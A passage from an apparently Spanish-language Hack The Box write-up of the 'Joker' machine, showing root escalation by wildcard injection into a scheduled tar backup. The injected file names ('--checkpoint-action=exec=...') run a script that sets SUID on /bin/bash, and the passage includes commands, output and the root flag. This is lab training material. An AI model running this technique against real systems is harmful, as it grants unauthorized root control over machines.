+dev-1693005601.tar.gz  dev-1693006501.tar.gz  dev-1693007401.tar.gz  dev-1693008301.tar.gz  dev-1693009201.tar.gz  dev-1693010101.tar.gz  dev-1693011002.tar.gz
+</code></pre>
+
+<p>Si descomprimimos alguno de los comprimidos, obsevamos que dentro de este vemos los mismos archivos que se encontraban en la ruta <code>development</code>. Podemos intuir entonces que mediante una tarea que se ejecuta a intervalos regulares de tiempo, se esta comprimiendo todo el contenido del directorio <code>development</code> y lo esta almancenando en <code>backup</code>.</p>
+
+<pre><code class="language-bash">alekos@joker:~/backup$ cp dev-1514134201.tar.gz /tmp/
+alekos@joker:~/backup$ cd /tmp/
+alekos@joker:/tmp$ ls
+dev-1514134201.tar.gz  f  systemd-private-67c5a0aba61c4233b0464cb22f25c7cb-systemd-timesyncd.service-5cvsvV  vmware-root
+alekos@joker:/tmp$ mkdir test
+alekos@joker:/tmp$ cd test/
+alekos@joker:/tmp/test$ mv ../dev-1514134201.tar.gz .
+alekos@joker:/tmp/test$ tar -xf dev-1514134201.tar.gz 
+alekos@joker:/tmp/test$ ls
+__init__.py  application.py  data  dev-1514134201.tar.gz  models.py  static  templates  utils.py  views.py
+</code></pre>
+
+<p>Viendo esto lo mas probable es que se este usando <code>tar</code>, ejecutandolo de esta manera <code>tar -cf /development/*</code> y dado el caso podriamos aprovechar el uso de Wildcards y tratar de obtener una shell.</p>
+
+<p>Si usamos nuestra web de confianza:</p>
+
+<ul>
+  <li><a href="https://gtfobins.github.io/gtfobins/tar/#shell">https://gtfobins.github.io/gtfobins/tar/#shell</a></li>
+</ul>
+
+<p>Vemos que para obtener una shell, podemos hacerlo con los siguientes parametros.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Joker/joker10.PNG" alt="" /></p>
+
+<p>Y como se esta utilizando Wildcards, podemos crearnos dos archivos de nombre <code>--checkpoint=1</code> y <code>--checkpoint-action=exec=EJECUTA LO QUE QUIERAS</code>.</p>
+
+<p>Para ello al crear los archivos que contienen <code>-</code>, debemos anteponer <code>--</code> para hacerlo correctamente.</p>
+
+<p>En el segundo archivo que corresponde a la ejecución, voy a crearme un archivo en python el cual otorgue el permiso <code>suid</code> a la bash.</p>
+
+<pre><code class="language-python">alekos@joker:~/development$ cat abusing_wildcard.py 
+import os
+
+os.system("chmod u+s /bin/bash")
+</code></pre>
+
+<p>y seguidamente voy a crear los dos archivos necesarios, de modo que al ejecutarse el comando <code>tar</code> sobre todos los archivos tomara los nombres de estos dos ultimos como parametros y en consecuencia ejecutara el comando asignado, otorgando el privilegio <code>suid</code> a la bash.</p>
+
+<pre><code class="language-bash">alekos@joker:~/development$ touch -- --checkpoint=1
+alekos@joker:~/development$ touch -- '--checkpoint-action=exec=python abusing_wildcard.py'
+alekos@joker:~/development$ ls -l
+total 32
+-rw-rw-r-- 1 alekos alekos    0 Aug 26 04:05 --checkpoint-action=exec=python abusing_wildcard.py
+-rw-rw-r-- 1 alekos alekos    0 Aug 26 04:04 --checkpoint=1
+-rw-r----- 1 alekos alekos    0 May 18  2017 __init__.py
+-rw-rw-r-- 1 alekos alekos   44 Aug 26 04:07 abusing_wildcard.py
+-rw-r----- 1 alekos alekos 1452 May 18  2017 application.py
+drwxrwx--- 2 alekos alekos 4096 May 18  2017 data
+-rw-r----- 1 alekos alekos  997 May 18  2017 models.py
+drwxr-x--- 2 alekos alekos 4096 May 18  2017 static
+drwxr-x--- 2 alekos alekos 4096 May 18  2017 templates
+-rw-r----- 1 alekos alekos 2500 May 18  2017 utils.py
+-rw-r----- 1 alekos alekos 1748 May 18  2017 views.py
+</code></pre>
+
+<p>Pasado unos minutos listamos la bash y vemos que se le dio el permiso correspondiente de manera exitosa.</p>
+
+<pre><code class="language-bash">alekos@joker:~/development$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1041576 May 16  2017 /bin/bash
+</code></pre>
+
+<p>Finalmente lo que nos quedaria por hacer es convertimos como el usuario <code>root</code> y leer la segunda flag <code>root.txt</code>.</p>
+
+<pre><code class="language-bash">alekos@joker:~/development$ bash -p
+bash-4.3# whoami
+root
+bash-4.3# cd /root/
+bash-4.3# cat root.txt 
+bash-4.3# cat root.txt 
+90fcbcbbb01891eec43448b6b6d7051b
+</code></pre>
+
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        ⚉
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=Maquina Joker - htb writeup&url=http://localhost:4000/hackthebox/htb-writeup-Joker" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/1014319" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/Firtsmiracle" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+
+    </div>
+
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Jekyll Theme by</a> WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+<!-- Bootstrap and images ZOOM feature
+================================================== -->
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+</body>
+</html>
